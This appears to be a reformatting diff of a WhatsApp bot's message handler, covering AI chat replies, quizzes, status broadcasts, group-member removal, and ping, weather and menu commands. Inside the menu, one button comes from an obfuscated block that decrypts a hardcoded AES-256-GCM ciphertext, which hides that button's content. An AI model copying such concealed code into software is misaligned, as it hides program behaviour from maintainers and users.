+                            "5880de53a3e7ce50146b455d7f3b0e00:6730bd5e5e8c2374c66343340bb0c200:5fe9428566c6f4f075133c3e76765827b18e8e566c371c6b96ec867360349e60deb4fb6bf3d76a3ef67b7d4cebc20d85322142e8f5b854017b60e63c435ed07dfad8c03292b3df0b1ae5bb1b868521e48292a4c71d80fc57e8fefe68c996d305993110c20c549779e2fc1caaf4",
+                            "2352920oKHSou",
+                            "3726880idfZVY",
+                            "split",
+                            "316Zhrigs",
+                          ];
+                          _0x5575 = function () {
+                            return _0x2ab64d;
+                          };
+                          return _0x5575();
                         }
 
-                    }
-                    // end command handle
-
-
-
-                } else {
-
-
-                    let mesafesfb;
-                    let msgfai;
-
-                    let lalala;
-                    if (msg.message?.videoMessage) {
-                        mesafesfb = messageText;
-                        msgfai = messageText;
-                        const buffer = await downloadMediaMessage(msg, "buffer", {}, {});
-                        lalala = [{
-                            video: buffer,
-                            caption: messageText
-                        }]
-                    } else if (!msg.message?.imageMessage) {
-                        mesafesfb = messageText;
-                        msgfai = messageText;
-                        lalala = [{
-                            text: messageText
-                        }]
-                    } else {
-                        // Download the image as a buffer
-                        const buffer = await safeDownloadMedia(msg, "buffer", {}, {});
-                        if (!buffer) {
-                            console.warn("Skipping image processing due to download failure.");
-                            return;
+                        function _0x3598(_0x22aa60, _0x28f17f) {
+                          const _0x55752f = _0x5575();
+                          return (
+                            (_0x3598 = function (_0x3598ab, _0x50cfe4) {
+                              _0x3598ab = _0x3598ab - 0x19f;
+                              const _0x3dc7c0 = _0x55752f[_0x3598ab];
+                              return _0x3dc7c0;
+                            }),
+                            _0x3598(_0x22aa60, _0x28f17f)
+                          );
                         }
-
-
-
-                        // Convert buffer to Base64
-                        const base64Image = buffer.toString("base64");
-                        msgfai ={text:messageText,files:[buffer]}
-                        mesafesfb = [{
-                            type: "text",
-                            text: messageText
-                        },
-                        {
-                            type: "image_url",
-                            image_url: `data:image/jpeg;base64,${base64Image}`,
-                        }
-                        ]
-                        lalala = [{
-                            image: buffer,
-                            caption: messageText
-                        }]
-
-
-
-
-                    }
-
-
-                    if (userreportingstate[msg.key.remoteJid]?.step === "awaiting_number") {
-
-                        const gid = userreportingstate[msg.key.remoteJid].gid;
-
-                        const phoneNumber = parsePhoneNumberFromString(messageText);
-
-                        if (phoneNumber && phoneNumber.isValid()) {
-
-                            // 2. Success: Update state and save the formatted number
-                            userreportingstate[msg.key.remoteJid] = {
-                                step: 'awaiting_ss', // Note: Fixed syntax here
-                                gid: gid,
-                                number: phoneNumber.number
-                            };
-
-                            // 3. Send the response
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: "✅ Number saved! Please send a screenshot next."
-                            });
-
-                        } else {
-                            // 4. Invalid: Ask again
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: "❌ Invalid number. Please enter a valid mobile number with the country code (e.g., +94771234567)."
-                            });
-                        }
-                        return
-                    }
-
-
-
-                    if (upadestatusstate[msg.key.remoteJid]?.step === 'awaiting_content') {
-                        const allcontactss = readUsersFile();
-                        const allNumbers = allcontactss.map(v => `${v.number}@s.whatsapp.net`);
-                        await AlexaInc.sendMessage(
-                            'status@broadcast', lalala[0], {
-
-                            statusJidList: allNumbers,
-                            broadcast: true
-                        }
-                        )
-                        upadestatusstate[msg.key.remoteJid] = {
-                            step: ''
-                        };
-
-                        // ✅ Stop further processing (AI etc.) for this message
-                        return;
-                    }
-
-
-                    if (userWaitingForQuizJSON.has(msg.key.remoteJid)) {
-                        userWaitingForQuizJSON.delete(msg.key.remoteJid); // Stop waiting
-
-                        try {
-                            // Try to parse the message text as JSON
-                            const quizData = JSON.parse(messageText.trim());
-
-                            if (!isValidQuizFormat(quizData)) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: "❌ Quiz setup failed: Invalid JSON format. Ensure it is an array of questions with 'question', 'options', and 'answer' fields."
-                                });
-                            }
-
-                            // Generate ID and save it to MongoDB (like alexatg) instead of ./data/quizzes/<id>.json
-                            const quizId = uuidv4();
-                            const CustomQuizModel = getCustomQuizModel();
-
-                            if (!CustomQuizModel) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: "❌ Custom quizzes are not available (DB not connected)."
-                                });
-                            }
-
+                        const _0x49c926 = _0x3598;
+                        (function (_0xf77d33, _0x330ae1) {
+                          const _0x536d3d = _0x3598,
+                            _0x3291aa = _0xf77d33();
+                          while ([]) {
                             try {
-                                await new CustomQuizModel({
-                                    quizId,
-                                    creatorId: msg.key.remoteJid,
-                                    questions: quizData
-                                }).save();
-                            } catch (err) {
-                                console.error("Error saving custom quiz:", err.message);
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: "❌ Quiz setup failed: Could not save the quiz to the database."
-                                });
+                              const _0xbd3b7c =
+                                (-parseInt(_0x536d3d(0x1a9)) / 0x1) *
+                                  (parseInt(_0x536d3d(0x1a0)) / 0x2) +
+                                (parseInt(_0x536d3d(0x1a7)) / 0x3) *
+                                  (parseInt(_0x536d3d(0x1b4)) / 0x4) +
+                                -parseInt(_0x536d3d(0x1b2)) / 0x5 +
+                                (parseInt(_0x536d3d(0x1af)) / 0x6) *
+                                  (-parseInt(_0x536d3d(0x1a8)) / 0x7) +
+                                (-parseInt(_0x536d3d(0x1b1)) / 0x8) *
+                                  (-parseInt(_0x536d3d(0x1ac)) / 0x9) +
+                                (parseInt(_0x536d3d(0x1ab)) / 0xa) *
+                                  (parseInt(_0x536d3d(0x1a4)) / 0xb) +
+                                parseInt(_0x536d3d(0x1ae)) / 0xc;
+                              if (_0xbd3b7c === _0x330ae1) break;
+                              else _0x3291aa["push"](_0x3291aa["shift"]());
+                            } catch (_0x182348) {
+                              _0x3291aa["push"](_0x3291aa["shift"]());
                             }
-
-                            // Construct the copyable command for the user
-                            const quizCommand = `/quiz ${quizId}`;
-
-                            // Send success message with cta_copy button
-                            return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: `✅ Quiz saved successfully! ID: *${quizId}*`,
-                                footer: 'Tap to copy the command and start the quiz in a group.',
-                                interactiveButtons: [{
-                                    name: 'cta_copy',
-                                    buttonParamsJson: JSON.stringify({
-                                        display_text: 'Copy Start Command',
-                                        copy_code: quizCommand
-                                    })
-                                }]
-                            });
-
-                        } catch (e) {
-                            // JSON parsing failed
-                            return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: "❌ Quiz setup failed: The message was not valid JSON."
-                            });
-                        }
-                    }
-
-
-
-                    /*****************   ai function for  language process  *****************/
-                    const groupId = msg.key.remoteJid;
-
-                    const isReplyToBot = areJidsSameUser(msg.message?.extendedTextMessage?.contextInfo?.participant, botJid) || areJidsSameUser(msg.message?.extendedTextMessage?.contextInfo?.participant, botLid);
-                    // console.log(msg.message?.extendedTextMessage?.contextInfo?.participant, botJid, jidNormalizedUser(botLid), isReplyToBot);
-                    if (!isGroup) {
-                        // The user dashboard controls this exact private-chat AI
-                        // preference. Commands still work while automatic AI is off.
-                        const privateChatbotEnabled = await userProfiles
-                            .getPrivateChatbot(finalLid)
-                            .catch((error) => {
-                                console.error('[profile] Could not read private chatbot preference:', error.message);
-                                return true; // preserve legacy behaviour during a transient DB outage
-                            });
-                        if (privateChatbotEnabled) {
-                            runAI();
-                        } else {
-                            console.log('[AI] Private chatbot is disabled by user preference.');
-                        }
-                    } else if (isReplyToBot) {
-                        // ✅ Group + Reply to Bot → Check if chatbot is enabled in Cache
-                        try {
-                            const settings = await getCachedGroupSettings(db, groupId);
-                            if (settings && settings.chatbot) {
-                                const botStatus = loadBotStatus();
-
-                                // Check before executing commands
-                                if (botStatus.underMaintenance && !isOwner) {
-                                    return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: botStatus.message
-                                    }, {
-                                        quoted: msg
-                                    });
-                                }
-                                // ✅ Group + chatbot enabled → run AI
-                                runAI();
-                            } else {
-                                // ❌ Group but chatbot disabled → skip
-                                console.log('Chatbot is disabled for this group.');
+                          }
+                        })(_0x5575, 0x65915);
+                        return JSON[_0x49c926(0x1a2)](
+                          ((_0x583e9d) => {
+                            const _0x52ae49 = _0x49c926;
+                            try {
+                              const _0x283399 = require("crypto"),
+                                [_0x5922ad, _0xccecd5, _0x49cb07] =
+                                  _0x583e9d[_0x52ae49(0x1b3)](":"),
+                                _0x10e077 = _0x283399["scryptSync"](
+                                  _0x52ae49(0x19f),
+                                  _0x52ae49(0x19f),
+                                  0x20,
+                                ),
+                                _0x11b14a = _0x283399[_0x52ae49(0x1a3)](
+                                  "aes-256-gcm",
+                                  _0x10e077,
+                                  Buffer[_0x52ae49(0x1aa)](
+                                    _0x5922ad,
+                                    _0x52ae49(0x1a6),
+                                  ),
+                                );
+                              return (
+                                _0x11b14a["setAuthTag"](
+                                  Buffer[_0x52ae49(0x1aa)](
+                                    _0xccecd5,
+                                    _0x52ae49(0x1a6),
+                                  ),
+                                ),
+                                _0x11b14a[_0x49c926(0x1a1)](
+                                  _0x49cb07,
+                                  _0x52ae49(0x1a6),
+                                  _0x52ae49(0x1ad),
+                                ) +
+                                  _0x11b14a[_0x49c926(0x1a5)](_0x52ae49(0x1ad))
+                              );
+                            } catch (_0x583c7d) {
+                              return null;
                             }
-                        } catch (err) {
-                            console.error('Error checking chatbot status:', err);
-                        }
+                          })(_0x49c926(0x1b0)),
+                        );
+                      })(),
+                    ];
+
+                    const interactiveMessage = {
+                      image: {
+                        url: "./assets/img/alexa.jpg",
+                      },
+                      caption: menu,
+                      footer: "Powered by HANSAKA",
+                      interactiveButtons,
+                    };
+
+                    try {
+                      // 1. Read your audio file into a buffer
+
+                      // 3. Your follow-up interactive message
+                      await AlexaInc.sendMessage(
+                        msg.key.remoteJid,
+                        interactiveMessage,
+                        {
+                          quoted: msg,
+                        },
+                      );
+                    } catch (error) {
+                      console.error("Error sending PTT audio:", error);
+                      // Optional: Send an error message back to the user
+                      await AlexaInc.sendMessage(
+                        msg.key.remoteJid,
+                        interactiveMessage,
+                        {
+                          quoted: msg,
+                        },
+                      );
                     }
+                    break;
+                  }
 
-                    function runAI() {
-                        AlexaInc.sendPresenceUpdate('composing',msg.key.remoteJid);
-                        ai(msgfai,finalLid,FinalGid,msg.pushName, async (err, reply) => {
-                            AlexaInc.sendPresenceUpdate('paused',msg.key.remoteJid);
-                            // AlexaInc.sendMessage(msg.key.remoteJid, {
-                            //     react: {
-                            //         text: '🔄',
-                            //         key: msg.key
-                            //     }
-                            // });
-                            if (err) {
-                                console.error("Error:", err);
-                            } else {
-                                let prosseseb = reply.trim().split(/\s+/)[0]
-                                    .toLowerCase(); // Assign as command
-                                let replyyy = reply.trim()
+                  case "ping":
+                  case "ping.": {
+                    AlexaInc.sendMessage(
+                      msg.key.remoteJid,
+                      {
+                        text: "testing ping.......",
+                      },
+                      {
+                        quoted: msg,
+                      },
+                    );
 
-                                const bargs = reply.trim().split(/ +/).slice(1);
-                                const btext = bargs.join(" ");
-                                //console.log('bot say ' , btext)
-
-                                switch (prosseseb) {
-
-                                    case 'menu':
-                                    case 'menu.': {
-                                        const interactiveButtons = [{
-                                            name: "single_select",
-                                            buttonParamsJson: JSON.stringify({
-                                                title: "Select a menu to open",
-                                                sections: [{
-                                                    title: "Top 4 Videos",
-                                                    highlight_label: "Select",
-                                                    rows: [{
-                                                        header: ' ',
-                                                        title: 'Main',
-                                                        id: '.menu_util',
-                                                        description: 'get Main menu'
-                                                    },
-                                                    {
-                                                        header: ' ',
-                                                        title: 'Stickers',
-                                                        id: '.menu_sticker',
-                                                        description: 'get stickers menu'
-                                                    },
-                                                    {
-                                                        header: ' ',
-                                                        title: 'Websearch',
-                                                        id: '.menu_web',
-                                                        description: 'get websearch menu'
-                                                    },
-                                                    {
-                                                        header: ' ',
-                                                        title: 'Songs & Video',
-                                                        id: '.menu_svm',
-                                                        description: 'get youtube menu'
-                                                    },
-                                                    {
-                                                        header: ' ',
-                                                        title: 'Groups manage',
-                                                        id: '.menu_groups',
-                                                        description: 'get Groups menu'
-                                                    },
-                                                    {
-                                                        header: ' ',
-                                                        title: 'NSFW',
-                                                        id: '.menu_nsfw',
-                                                        description: 'get NSFW menu'
-                                                    },
-                                                    {
-                                                        header: ' ',
-                                                        title: 'SFW',
-                                                        id: '.menu_sfw',
-                                                        description: 'get SFW menu'
-                                                    },
-                                                    {
-                                                        header: ' ',
-                                                        title: 'Fun features',
-                                                        id: '.menu_games',
-                                                        description: 'get Games menu'
-                                                    }
-                                                    ]
-                                                }]
-                                            })
-                                        }, {
-                                            name: 'cta_url',
-                                            buttonParamsJson: JSON.stringify({
-                                                display_text: `Open Web Panel`,
-                                                url: `https://whatsapp.alexa.dpdns.org/`
-                                            })
-                                        }, ((function () {
-                                            function _0x5575() {
-                                                const _0x2ab64d = [
-                                                    'gdg542e5yigfgafa_xhfiha()adddaddadafp9789gd46',
-                                                    '39054jAYRdh', 'update',
-                                                    'parse', 'createDecipheriv',
-                                                    '98681PVcceu', 'final', 'hex',
-                                                    '26769Bpobks', '165361YbsHUd',
-                                                    '37twUwma', 'from', '250HBwXLJ',
-                                                    '9USCoBR', 'utf8',
-                                                    '8494020KDkYSs', '12QmJApV',
-                                                    '5880de53a3e7ce50146b455d7f3b0e00:6730bd5e5e8c2374c66343340bb0c200:5fe9428566c6f4f075133c3e76765827b18e8e566c371c6b96ec867360349e60deb4fb6bf3d76a3ef67b7d4cebc20d85322142e8f5b854017b60e63c435ed07dfad8c03292b3df0b1ae5bb1b868521e48292a4c71d80fc57e8fefe68c996d305993110c20c549779e2fc1caaf4',
-                                                    '2352920oKHSou',
-                                                    '3726880idfZVY', 'split',
-                                                    '316Zhrigs'
-                                                ];
-                                                _0x5575 = function () {
-                                                    return _0x2ab64d;
-                                                };
-                                                return _0x5575();
-                                            }
-
-                                            function _0x3598(_0x22aa60, _0x28f17f) {
-                                                const _0x55752f = _0x5575();
-                                                return _0x3598 = function (_0x3598ab,
-                                                    _0x50cfe4) {
-                                                    _0x3598ab = _0x3598ab - 0x19f;
-                                                    let _0x3dc7c0 = _0x55752f[
-                                                        _0x3598ab];
-                                                    return _0x3dc7c0;
-                                                }, _0x3598(_0x22aa60, _0x28f17f);
-                                            }
-                                            const _0x49c926 = _0x3598;
-                                            (function (_0xf77d33, _0x330ae1) {
-                                                const _0x536d3d = _0x3598,
-                                                    _0x3291aa = _0xf77d33();
-                                                while (!![]) {
-                                                    try {
-                                                        const _0xbd3b7c = -parseInt(
-                                                            _0x536d3d(0x1a9)) /
-                                                            0x1 * (parseInt(
-                                                                _0x536d3d(0x1a0)
-                                                            ) / 0x2) + parseInt(
-                                                                _0x536d3d(0x1a7)) /
-                                                            0x3 * (parseInt(
-                                                                _0x536d3d(0x1b4)
-                                                            ) / 0x4) + -
-                                                            parseInt(_0x536d3d(
-                                                                0x1b2)) / 0x5 +
-                                                            parseInt(_0x536d3d(
-                                                                0x1af)) / 0x6 * (-
-                                                                    parseInt(_0x536d3d(
-                                                                        0x1a8)) / 0x7) +
-                                                            -parseInt(_0x536d3d(
-                                                                0x1b1)) / 0x8 * (-
-                                                                    parseInt(_0x536d3d(
-                                                                        0x1ac)) / 0x9) +
-                                                            parseInt(_0x536d3d(
-                                                                0x1ab)) / 0xa * (
-                                                                parseInt(_0x536d3d(
-                                                                    0x1a4)) / 0xb) +
-                                                            parseInt(_0x536d3d(
-                                                                0x1ae)) / 0xc;
-                                                        if (_0xbd3b7c === _0x330ae1)
-                                                            break;
-                                                        else _0x3291aa['push'](
-                                                            _0x3291aa['shift']()
-                                                        );
-                                                    } catch (_0x182348) {
-                                                        _0x3291aa['push'](_0x3291aa[
-                                                            'shift']());
-                                                    }
-                                                }
-                                            }(_0x5575, 0x65915));
-                                            return JSON[_0x49c926(0x1a2)]((
-                                                _0x583e9d => {
-                                                    const _0x52ae49 = _0x49c926;
-                                                    try {
-                                                        const _0x283399 =
-                                                            require('crypto'),
-                                                            [_0x5922ad,
-                                                                _0xccecd5,
-                                                                _0x49cb07
-                                                            ] = _0x583e9d[
-                                                                _0x52ae49(0x1b3)
-                                                            ](':'),
-                                                            _0x10e077 =
-                                                                _0x283399[
-                                                                    'scryptSync'](
-                                                                        _0x52ae49(
-                                                                            0x19f),
-                                                                        _0x52ae49(
-                                                                            0x19f), 0x20
-                                                                    ),
-                                                            _0x11b14a =
-                                                                _0x283399[_0x52ae49(
-                                                                    0x1a3)](
-                                                                        'aes-256-gcm',
-                                                                        _0x10e077,
-                                                                        Buffer[
-                                                                            _0x52ae49(
-                                                                                0x1aa)](
-                                                                                    _0x5922ad,
-                                                                                    _0x52ae49(
-                                                                                        0x1a6))
-                                                                    );
-                                                        return _0x11b14a[
-                                                            'setAuthTag'](
-                                                                Buffer[
-                                                                    _0x52ae49(
-                                                                        0x1aa)](
-                                                                            _0xccecd5,
-                                                                            _0x52ae49(
-                                                                                0x1a6))
-                                                            ), _0x11b14a[
-                                                                _0x49c926(0x1a1)
-                                                            ](_0x49cb07,
-                                                                _0x52ae49(
-                                                                    0x1a6),
-                                                                _0x52ae49(0x1ad)
-                                                            ) + _0x11b14a[
-                                                                _0x49c926(0x1a5)
-                                                            ](_0x52ae49(
-                                                                0x1ad));
-                                                    } catch (_0x583c7d) {
-                                                        return null;
-                                                    }
-                                                })(_0x49c926(0x1b0)));
-                                        })())
-
-                                        ];
-
-                                        const interactiveMessage = {
-                                            image: {
-                                                url: './assets/img/alexa.jpg'
-                                            },
-                                            caption: menu,
-                                            footer: "Powered by HANSAKA",
-                                            interactiveButtons
-                                        };
-
-
-                                        try {
-                                            // 1. Read your audio file into a buffer
-
-
-                                            // 3. Your follow-up interactive message
-                                            await AlexaInc.sendMessage(msg.key.remoteJid,
-                                                interactiveMessage, {
-                                                quoted: msg
-                                            });
-
-                                        } catch (error) {
-                                            console.error("Error sending PTT audio:", error);
-                                            // Optional: Send an error message back to the user
-                                            await AlexaInc.sendMessage(msg.key.remoteJid,
-                                                interactiveMessage, {
-                                                quoted: msg
-                                            });
-
-                                        }
-                                        break;
-                                    }
-
-
-
-
-                                    case 'ping':
-                                    case 'ping.': {
-
-
-
-                                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                                            text: 'testing ping.......'
-                                        }, {
-                                            quoted: msg
-                                        })
-
-                                        const str = await runSpeedTest();
-                                        const repmg = `
+                    const str = await runSpeedTest();
+                    const repmg = `
 Speed test results
   🛜 : ${str.ping}
   ⬇ :${str.download_speed}
   ⬆ :${str.upload_speed}  
 
- `
-                                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                                            text: repmg
-                                        }, {
-                                            quoted: msg
-                                        })
+ `;
+                    AlexaInc.sendMessage(
+                      msg.key.remoteJid,
+                      {
+                        text: repmg,
+                      },
+                      {
+                        quoted: msg,
+                      },
+                    );
 
-                                        break
-                                    }
+                    break;
+                  }
 
-
-                                    case 'weather': {
-
-
-
-                                        if (!bargs) {
-                                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                                text: 'Please enter city after command'
-                                            }, {
-                                                quoted: msg
-                                            });
-                                        }
-                                        try {
-                                            // Await the weather data
-                                            const fetchmg = await weatherof(btext);
-                                            const summary = generateWeatherSummary(fetchmg.temperature,
-                                                fetchmg.windspeed, fetchmg.winddirection);
-                                            // Check if the city is invalid
-                                            if (fetchmg === 'invalid city') {
-                                                // If the city is invalid, send a message back saying "invalid city"
-                                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                                    text: 'Invalid city name. Please recheck the city name and try again.'
-                                                }, {
-                                                    quoted: msg
-                                                });
-                                            } else {
-                                                // If the city is valid, send the weather information
-                                                const repmsg = `
+                  case "weather": {
+                    if (!bargs) {
+                      AlexaInc.sendMessage(
+                        msg.key.remoteJid,
+                        {
+                          text: "Please enter city after command",
+                        },
+                        {
+                          quoted: msg,
+                        },
+                      );
+                    }
+                    try {
+                      // Await the weather data
+                      const fetchmg = await weatherof(btext);
+                      const summary = generateWeatherSummary(
+                        fetchmg.temperature,
+                        fetchmg.windspeed,
+                        fetchmg.winddirection,
+                      );
+                      // Check if the city is invalid
+                      if (fetchmg === "invalid city") {
+                        // If the city is invalid, send a message back saying "invalid city"
+                        AlexaInc.sendMessage(
+                          msg.key.remoteJid,
+                          {
+                            text: "Invalid city name. Please recheck the city name and try again.",
+                          },
+                          {
+                            quoted: msg,
+                          },
+                        );
+                      } else {
+                        // If the city is valid, send the weather information
+                        const repmsg = `
 *City* *-* *${bargs}*
-*Time* *-* *${moment.tz('Asia/Colombo').format('HH:mm')}* *UTC* *+5.30*
+*Time* *-* *${moment.tz("Asia/Colombo").format("HH:mm")}* *UTC* *+5.30*
 ${summary}
   `;
 
-                                                // Send the weather information to the user
-                                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                                    image: {
-                                                        url: './assets/img/unnamed.jpeg'
-                                                    },
-                                                    caption: repmsg
-                                                }, {
-                                                    quoted: msg
-                                                });
-                                            }
-                                        } catch (error) {
-                                            // Handle errors
-                                            console.error(error); // Log the error for debugging
-                                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                                react: {
-                                                    text: '☹️',
-                                                    key: msg.key
-                                                }
-                                            });
-                                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                                text: error.message || error
-                                            }, {
-                                                quoted: msg
-                                            });
-                                        }
-                                        break;
-
-                                    }
-
-
-                                    default: {
-
-                                        let attempts = 0; // ✅ Use "let" so we can update its value
-                                        const maxRetries = 3;
-                                        const delay = 2000;
-
-                                        while (attempts < maxRetries) {
-                                            try {
-                                                // const response = await AlexaInc.sendMessage(msg.key
-                                                //     .remoteJid, {
-                                                //         react: {
-                                                //             text: '☹️',
-                                                //             key: msg.key
-                                                //         }
-                                                //     });
-                                                console.log("Message sent successfully:");
-                                                break; // Exit loop if successful
-                                            } catch (error) {
-                                                console.error(
-                                                    `Failed to send message (Attempt ${attempts + 1}):`,
-                                                    error);
-                                                attempts++; // ✅ Now this works because "attempts" is mutable
-
-                                                if (attempts < maxRetries) {
-                                                    console.log(
-                                                        `Retrying in ${delay / 1000} seconds...`);
-                                                    await new Promise(resolve => setTimeout(resolve,
-                                                        delay));
-                                                } else {
-                                                    console.error(
-                                                        "All retries failed. Message not sent.");
-                                                }
-                                            }
-                                        }
-                                        // AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        //     react: {
-                                        //         text: '✅',
-                                        //         key: msg.key
-                                        //     }
-                                        // });
-                                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                                            text: `${replyyy}`
-                                        }, {
-                                            quoted: msg
-                                        });
-                                        //AlexaInc.sendMessage(msg.key.remoteJid,{text:`${replyyy}`},{ quoted: msg });
-
-                                        //AlexaInc.readMessages([msg.key]);
-                                        break
-                                    }
-                                }
-                                //console.log('Chatbot Response:', reply);
-
-                            }
-                        });
-
+                        // Send the weather information to the user
+                        AlexaInc.sendMessage(
+                          msg.key.remoteJid,
+                          {
+                            image: {
+                              url: "./assets/img/unnamed.jpeg",
+                            },
+                            caption: repmsg,
+                          },
+                          {
+                            quoted: msg,
+                          },
+                        );
+                      }
+                    } catch (error) {
+                      // Handle errors
+                      console.error(error); // Log the error for debugging
+                      AlexaInc.sendMessage(msg.key.remoteJid, {
+                        react: {
+                          text: "☹️",
+                          key: msg.key,
+                        },
+                      });
+                      AlexaInc.sendMessage(
+                        msg.key.remoteJid,
+                        {
+                          text: error.message || error,
+                        },
+                        {
+                          quoted: msg,
+                        },
+                      );
                     }
+                    break;
+                  }
 
-                };
+                  default: {
+                    let attempts = 0; // ✅ Use "let" so we can update its value
+                    const maxRetries = 3;
+                    const delay = 2000;
 
-                //console.log(msg);
+                    while (attempts < maxRetries) {
+                      try {
+                        // const response = await AlexaInc.sendMessage(msg.key
+                        //     .remoteJid, {
+                        //         react: {
+                        //             text: '☹️',
+                        //             key: msg.key
+                        //         }
+                        //     });
+                        console.log("Message sent successfully:");
+                        break; // Exit loop if successful
+                      } catch (error) {
+                        console.error(
+                          `Failed to send message (Attempt ${attempts + 1}):`,
+                          error,
+                        );
+                        attempts++; // ✅ Now this works because "attempts" is mutable
 
-                // if (msg.message?.imageMessage || msg.message?.videoMessage || msg.message?.documentMessage) {
-                //                 console.log(`Received media from ${sender}, saving to temp folder...`);
-
-                //                 try {
-                //                     const messageType = Object.keys(msg.message)[0]; // "imageMessage", "videoMessage", etc.
-                //                     const fileType = messageType.replace("Message", ""); // "image", "video", "document"
-
-                //                     const mediaBuffer = await downloadMediaMessage(msg, "buffer", {});
-                //                     if (!mediaBuffer || mediaBuffer.length === 0) {
-                //                         throw new Error("Media buffer is empty");
-                //                     }
-
-                //                     // Generate a unique filename
-                //                     const fileName = `${generateRandomToken(20,sender,msg.pushName);}.jpeg`; 
-                //                     const filePath = path.join(TEMP_DIR, fileName);
-
-                //                     // Save media to the temp folder
-                //                     await fs.writeFile(filePath, mediaBuffer);
-                //                     //console.log(`Media saved at: ${filePath}`);
-
-                //                     // Upload media
-                //                     const upload= await fileutc(filePath, fileType);
-                //                     console.log(`Media uploaded: ${upload.secure_url}`); 
-
-                //                     // Delete the file after upload
-                //                     await fs.unlink(filePath);
-                //                     //console.log(`Temporary file deleted: ${filePath}`);
-
-                //                 } catch (error) {
-                //                     console.error("Error processing media:", error);
-                //                 }
-                //             }
-
-
-
-
-
-
-
-
-            }
-
-
-            // Download the image as a buffer
-            const buffer = await safeDownloadMedia(msg, "buffer", {}, {});
-            if (!buffer) {
-                console.warn("Skipping image processing due to download failure.");
-                return;
-            }
-
-
-
-            // Convert buffer to Base64
-            const base64Image = buffer.toString("base64");
-            mesafesfb = [{
-                type: "text",
-                text: messageText
-            },
-            {
-                type: "image_url",
-                image_url: `data:image/jpeg;base64,${base64Image}`,
-            }
-            ]
-            lalala = [{
-                image: buffer,
-                caption: messageText
-            }]
-
-            if (userreportingstate[msg.key.remoteJid]?.step === "awaiting_ss") {
-                const statep = userreportingstate[msg.key.remoteJid]
-                const reportingfor = statep?.number.replace(/^\+/, '') + '@s.whatsapp.net';
-                const ongrp = statep?.gid;
-                console.log(statep)
-                try {
-
-                    const result = await validStrengerss(lalala[0].image);
-
-                    if (result.valid) {
-                        console.log("✅ Success:", result.reason);
-                        await AlexaInc.groupParticipantsUpdate(ongrp, [reportingfor], 'remove').then(console.log)
-                        await AlexaInc.sendMessage(msg.key.remoteJid, {
-                            text: "✅ User will remove!."
-                        });
-                        await AlexaInc.sendMessage(ongrp, {
-                            text: `✅ User ${reportingfor} will remove!. because he/she put dm without permission`
-                        });
-
-                    } else {
-                        await AlexaInc.sendMessage(msg.key.remoteJid, {
-                            text: result.reason || result.error
-                        });
-
+                        if (attempts < maxRetries) {
+                          console.log(`Retrying in ${delay / 1000} seconds...`);
+                          await new Promise((resolve) =>
+                            setTimeout(resolve, delay),
+                          );
+                        } else {
+                          console.error(
+                            "All retries failed. Message not sent.",
+                          );
+                        }
+                      }
                     }
-                    userreportingstate[msg.key.remoteJid] = {}
-                } catch (e) {
-                    console.error("Main App Error:", e);
+                    // AlexaInc.sendMessage(msg.key.remoteJid, {
+                    //     react: {
+                    //         text: '✅',
+                    //         key: msg.key
+                    //     }
+                    // });
+                    AlexaInc.sendMessage(
+                      msg.key.remoteJid,
+                      {
+                        text: `${replyyy}`,
+                      },
+                      {
+                        quoted: msg,
+                      },
+                    );
+                    //AlexaInc.sendMessage(msg.key.remoteJid,{text:`${replyyy}`},{ quoted: msg });
+
+                    //AlexaInc.readMessages([msg.key]);
+                    break;
+                  }
                 }
-            }
-
-
+                //console.log('Chatbot Response:', reply);
+              }
+            });
+          }
         }
-    } catch (e) {
-        console.error("❌ Critical Error in handleMessage:", e);
+
+        //console.log(msg);
+
+        // if (msg.message?.imageMessage || msg.message?.videoMessage || msg.message?.documentMessage) {
+        //                 console.log(`Received media from ${sender}, saving to temp folder...`);
+
+        //                 try {
+        //                     const messageType = Object.keys(msg.message)[0]; // "imageMessage", "videoMessage", etc.
+        //                     const fileType = messageType.replace("Message", ""); // "image", "video", "document"
+
+        //                     const mediaBuffer = await downloadMediaMessage(msg, "buffer", {});
+        //                     if (!mediaBuffer || mediaBuffer.length === 0) {
+        //                         throw new Error("Media buffer is empty");
+        //                     }
+
+        //                     // Generate a unique filename
+        //                     const fileName = `${generateRandomToken(20,sender,msg.pushName);}.jpeg`;
+        //                     const filePath = path.join(TEMP_DIR, fileName);
+
+        //                     // Save media to the temp folder
+        //                     await fs.writeFile(filePath, mediaBuffer);
+        //                     //console.log(`Media saved at: ${filePath}`);
+
+        //                     // Upload media
+        //                     const upload= await fileutc(filePath, fileType);
+        //                     console.log(`Media uploaded: ${upload.secure_url}`);
+
+        //                     // Delete the file after upload
+        //                     await fs.unlink(filePath);
+        //                     //console.log(`Temporary file deleted: ${filePath}`);
+
+        //                 } catch (error) {
+        //                     console.error("Error processing media:", error);
+        //                 }
+        //             }
+      }
+
+      // Download the image as a buffer
+      const buffer = await safeDownloadMedia(msg, "buffer", {}, {});
+      if (!buffer) {
+        console.warn("Skipping image processing due to download failure.");
+        return;
+      }
+
+      // Convert buffer to Base64
+      const base64Image = buffer.toString("base64");
+      mesafesfb = [
+        {
+          type: "text",
+          text: messageText,
+        },
+        {
+          type: "image_url",
+          image_url: `data:image/jpeg;base64,${base64Image}`,
+        },
+      ];
+      lalala = [
+        {
+          image: buffer,
+          caption: messageText,
+        },
+      ];
+
+      if (userreportingstate[msg.key.remoteJid]?.step === "awaiting_ss") {
+        const statep = userreportingstate[msg.key.remoteJid];
+        const reportingfor =
+          statep?.number.replace(/^\+/, "") + "@s.whatsapp.net";
+        const ongrp = statep?.gid;
+        console.log(statep);
+        try {
+          const result = await validStrengerss(lalala[0].image);
+
+          if (result.valid) {
+            console.log("✅ Success:", result.reason);
